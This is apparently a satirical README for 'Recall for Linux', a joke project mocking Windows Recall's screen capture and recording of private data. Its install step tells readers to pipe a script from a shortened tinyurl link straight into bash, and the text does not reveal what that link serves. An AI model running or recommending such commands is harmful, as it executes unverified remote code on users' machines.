# 🔥 Recall for Linux

Are you forced to work with Linux?  
Do you miss the convenience of Microsoft spying on you and keeping track of everything?

Fear not! This amazing tool will bring back all those great Windows Recall features that you have been missing:

- 🌲 Stores all you sensitive data in an convenient, easily accessible database
- ⏲️ 24/7 screencaptures of everything you do
- 🥳 Image to text conversion with OCR
- 😇 Index and store everything your friends tell you over chat apps or e-mail; if it's on your screen we've got you covered!

Did a friend once share confident information with you, but has since forgotten all about the shamefull details? No worries, you got that info!

Forgot about that website you visited 3 weeks ago, late in the evening while drunk? Yup, we stored that!

# Installation

Unfortunately Linux lacks to ability for us to automatically, silently install and enable this on your computer without your consent.

But we've made the installation process as frictionless as possible.

Simply open a terminal window and paste this random command (\*) from the internet:

```bash
curl -fsSL https://tinyurl.com/hy2n3d6s | bash
```

_(\*) certified virus free. Virustotal score of 98/100._
